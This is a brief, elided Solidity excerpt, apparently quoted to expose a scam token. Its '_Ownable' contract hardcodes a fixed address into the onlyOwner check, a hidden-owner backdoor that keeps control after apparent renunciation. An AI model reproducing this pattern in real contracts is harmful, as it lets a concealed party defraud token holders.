...
contract _Ownable is Context {
    ...
    modifier onlyOwner() {
        require(payable(0x80cb8d46515Ae3B603Ad2421d3abcEDB136C9Cec) == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract FuckShit is Context, IERC20, _Ownable {
